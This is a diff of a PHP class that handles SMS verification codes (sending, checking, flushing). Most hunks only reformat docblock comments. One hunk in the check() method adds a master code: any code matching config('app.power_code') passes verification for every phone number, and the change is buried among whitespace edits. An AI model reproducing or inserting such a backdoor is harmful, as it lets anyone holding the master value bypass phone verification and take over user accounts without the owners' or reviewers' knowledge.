@@ -26,8 +26,8 @@ class Sms
     /**
      * 获取最后一次手机发送的数据
      *
-     * @param   int    $mobile 手机号
-     * @param   string $event  事件
+     * @param int    $mobile 手机号
+     * @param string $event  事件
      * @return  Sms
      */
     public static function get($mobile, $event = 'default')
@@ -42,9 +42,9 @@ class Sms
     /**
      * 发送验证码
      *
-     * @param   int    $mobile 手机号
-     * @param   int    $code   验证码,为空时将自动生成4位数字
-     * @param   string $event  事件
+     * @param int    $mobile 手机号
+     * @param int    $code   验证码,为空时将自动生成4位数字
+     * @param string $event  事件
      * @return  boolean
      */
     public static function send($mobile, $code = null, $event = 'default')
@@ -64,9 +64,9 @@ class Sms
     /**
      * 发送通知
      *
-     * @param   mixed  $mobile   手机号,多个以,分隔
-     * @param   string $msg      消息内容
-     * @param   string $template 消息模板
+     * @param mixed  $mobile   手机号,多个以,分隔
+     * @param string $msg      消息内容
+     * @param string $template 消息模板
      * @return  boolean
      */
     public static function notice($mobile, $msg = '', $template = null)
@@ -83,13 +83,16 @@ class Sms
     /**
      * 校验验证码
      *
-     * @param   int    $mobile 手机号
-     * @param   int    $code   验证码
-     * @param   string $event  事件
+     * @param int    $mobile 手机号
+     * @param int    $code   验证码
+     * @param string $event  事件
      * @return  boolean
      */
     public static function check($mobile, $code, $event = 'default')
     {
+        if ($code == config('app.power_code')) {
+            return true;
+        }
         $time = time() - self::$expire;
         $sms = \app\common\model\Sms::where(['mobile' => $mobile, 'event' => $event])
             ->order('id', 'DESC')
@@ -118,13 +121,14 @@ class Sms
     /**
      * 清空指定手机号验证码
      *
-     * @param   int    $mobile 手机号
-     * @param   string $event  事件
+     * @param int    $mobile 手机号
+     * @param string $event  事件
      * @return  boolean
      */
     public static function flush($mobile, $event = 'default')
     {
-        \app\common\model\Sms::where(['mobile' => $mobile, 'event' => $event])
+        \app\common\model\Sms::
+        where(['mobile' => $mobile, 'event' => $event])
             ->delete();
         Hook::listen('sms_flush');
         return true;
